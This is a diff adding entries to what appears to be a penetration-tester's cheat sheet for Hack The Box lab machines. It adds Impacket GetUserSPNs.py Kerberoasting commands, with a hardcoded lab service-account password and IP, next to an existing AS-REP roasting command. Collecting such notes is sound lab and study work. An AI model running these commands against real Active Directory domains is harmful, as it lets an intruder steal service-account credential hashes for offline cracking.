@@ -73,3 +73,15 @@ Queries target domain for users with 'Do not require Kerberos preauthentication'
 ```
 python GetNPUsers.py htb.local/ -no-pass -usersfile domain_users.txt -format hashcat
 ```
+
+## Kerberoasting
+Query Domain for any Kerberoastable Users
+```
+python GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.57.178
+```
+
+## Kerberoast (request ticket)
+Request ticket for account
+```
+python GetUserSPNs.py ACTIVE.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.57.178 -request -outfile user-spn.hash
+```
